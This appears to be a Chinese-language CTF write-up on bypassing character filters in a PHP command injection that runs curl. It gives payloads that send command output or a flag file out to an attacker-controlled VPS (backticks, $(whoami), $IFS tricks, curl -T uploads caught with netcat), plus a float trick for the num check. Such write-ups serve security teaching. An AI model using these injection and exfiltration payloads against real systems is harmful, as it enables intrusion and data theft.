---
title: 绕过curl命令执行过滤
date: 2017-04-08 13:08:40
categories: CTF
tags:
    - curl
    - 命令执行
---

## 常见命令执行

```php
system("curl $cmd");
```

用上面php代码为例, 存在命令执行，由于没有回显，需要自己搭建服务器接收数据，这里就不过多叙述。常用命令执行有: `` ` ``, ` $() `, 如:

```
curl vps.com/`whoami`
curl vps.com/$(whoami)

# IFS绕过空格
curl$IFSvps.com/$(whoami)
curl${IFS}vps.com/$(whoami)

# base64 编码绕过空格或特殊字符过滤
curl vps.com/$(id|base64)
```

<!-- more -->

## CTF实例

```php
<?php

error_reporting(E_ALL || ~E_NOTICE);

function strreplace($str){
    $str = str_replace('`','',$str);
    $str = str_replace(';','',$str);
    $str = str_replace('|','',$str);
    $str = str_replace('&','',$str);
    $str = str_replace('>','',$str);
    $str = str_replace('<','',$str);
    $str = str_replace('(','',$str);
    $str = str_replace(')','',$str);
    $str = str_replace('{','',$str);
    $str = str_replace('}','',$str);
    $str = str_replace('%','',$str);
    $str = str_replace('#','',$str);
    $str = str_replace('!','',$str);
    $str = str_replace('?','',$str);
    $str = str_replace('@','',$str);
    $str = str_replace('+','',$str);
    $str = str_replace('/','',$str); //这句是为了保证服务器安全的,防止利用../ 和 绝对路径 进行任意文件读取,与次题目解答无关


    $str = str_replace(':','',$str);  //添加这一句

    return $str;
}


if($_GET['num']<>""){
    $num = $_GET['num'];
    if(strstr($num,'1')){
        die("Sorry");
    }elseif($num <> 1){
        echo "Try to num = 1";
    }

    if($num == 1 ){
        echo "Flag in http://127.0.0.1/flag.php"."</br>";
        $cmd=trim($_GET['cmd']);
        $cmd=strreplace($cmd);

        system("curl$cmd/flag.php");
    }
} else {
    echo "It Works!";
}

?>
```

### 思路

#### num参数判断

get传递的num参数需要==1，但是又经过strstr()函数，即num中不能存在1，这里利用php特性，0.99999999999999就会产生小数下标溢出为1，即可绕过第一步；

#### cmd参数过滤

`curl$cmd/flag.php`，curl紧贴cmd参数，中间没有空格

```
trim()函数过滤了cmd两端的空格，可以用 $IFS 绕过，
经过strreplace()函数，将一部分符号过滤掉了，并未过滤 $ ;
```

`%`过滤了，不能利用`%0a`换行符来绕过；`;`分号，`&`逻辑与，`|`逻辑或，都过滤掉了。

#### 读flag内容

* 利用 `file`协议

```
http://192.168.1.101/index.php?num=0.99999999999999999999&cmd=$IFSfile:///$PWD
```

file协议常见格式如下:

```
# *nix
file://localhost/etc/fstab
file:///etc/fstab

# windows
file://localhost/c|/WINDOWS/clock.avi
file:///c|/WINDOWS/clock.avi
file://localhost/c:/WINDOWS/clock.avi
# Here is the URI as understood by the Windows Shell API
file:///c:/WINDOWS/clock.avi

# network location:

file://hostname/path/to/file.txt
```

另外：`$PWD`要大写，因为在PHP中内核常量必须要求大写；php中`file协议`读取出来的文件内容会放到网页源代码中，右键查看源代码即可看到内容。

但是这种方式不适合本题, 题目过滤了`/`。

* curl -T 上传文件到主机并通过监听来获取文件内容

curl不仅仅可以下载文件，还可以上传文件，通过内置`option -T`来实现, 这就可以利用curl的这个功能来将文件PUT上传给我们的主机，由于PUT method是HTTP的，所以主机需要支持web服务，然后带上端口, 由于题目过滤了`:`，于是只能使用80端口了。

```
http://192.168.1.101/index.php?num=0.99999999999999999999&cmd=$IFS-T flag.php -a your_vps_ip
```

然后再vps上监听80端口`nc -lvv 80`，即可拿到文件内容

```
root@iZbyhbtw2xco3tZ:~# nc -lvv 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from [121.194.2.43] port 80 [tcp/http] accepted (family 2, sport 40156)
PUT /flag.php HTTP/1.1
User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.21 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2
Host: 120.25.91.96
Accept: */*
Content-Length: 91
Expect: 100-continue

<?php

die("小样,还想偷看flag!");

$flag="flag{0fNcf32079b7L6e71021d8Qcd70e32lp}";
```

## 后记

IFS变量，IFS是internal field separator的缩写，shell的特殊环境变量。ksh根据IFS存储的值，可以是空格、tab、换行符或者其他自定义符号，来解析输入和输出的变量值
